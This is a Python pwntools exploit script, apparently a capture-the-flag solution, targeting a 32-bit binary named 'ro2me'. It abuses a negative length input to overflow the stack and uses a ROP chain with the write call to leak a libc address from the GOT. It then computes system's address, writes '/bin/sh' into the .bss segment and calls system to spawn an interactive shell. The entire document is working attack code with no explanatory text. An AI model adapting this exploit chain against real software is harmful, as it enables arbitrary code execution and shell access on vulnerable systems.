from pwn import *

LOCAL = True
elf = ELF('./ro2me')
#context.log_level = 'debug'
context.arch = 'i386'

pops_addr = 0x8048735
padding = 'a'*0x38
vuln_addr = 0x80485FD
bss_w_addr = 0x804A034

def ro_gadget(func, arg1, arg2, arg3, ret_addr):
    payload = p32(func)
    payload += p32(pops_addr)
    payload += p32(arg1)
    payload += p32(arg2)
    payload += p32(arg3)
    payload += p32(ret_addr)*4
    payload += p32(pops_addr)
    payload += p32(ret_addr)*7
    payload += p32(ret_addr)
    return payload

def leak(address):
    io.recvuntil("bytes you need")
    io.sendline(str(-1))
    io.recvuntil("Leave your code for the first time :)")
    payload = padding
    payload += ro_gadget(elf.plt['write'], 1, address, 40, vuln_addr)
    io.sendline(payload)
    io.recvuntil("the TE!\n")
    data = io.recv(4)
    return data

def ro_pwn(io):
    #raw_input('testleak')
    #leak(bss_w_addr)
    #raw_input('over test')
    #dym = DynELF(leak, elf=elf)
    #system_addr = dym.lookup('system', 'libc')
    read_addr = u32(leak(elf.got['read']))
    print 'read address:', hex(read_addr)
    libc_addr = read_addr - 0xD5980
    print 'libc address:', hex(libc_addr)
    system_addr = libc_addr + 0x3ADA0
    print 'system address:', hex(system_addr)
    # read binsh
    io.recvuntil("bytes you need")
    io.sendline(str(-1))
    io.recvuntil("Leave your code for the first time :)")
    payload = padding
    payload += ro_gadget(elf.plt['read'], 0, bss_w_addr, 8, vuln_addr)
    raw_input("got?")
    io.sendline(payload)
    io.recvuntil("the TE!\n")
    io.send('/bin/sh\x00')
    raw_input("got?")
    payload = padding
    payload += p32(system_addr)
    payload += p32(vuln_addr)
    payload += p32(bss_w_addr)
    io.recvuntil("bytes you need")
    io.sendline(str(-1))
    io.recvuntil("Leave your code for the first time :)")
    io.sendline(payload)
    raw_input("over write?")

    io.interactive()

if __name__ == '__main__':
    if LOCAL:
        io = process('./ro2me')
    else:
        io = remote('127.0.0.1', 24500)
    ro_pwn(io)
    io.close()



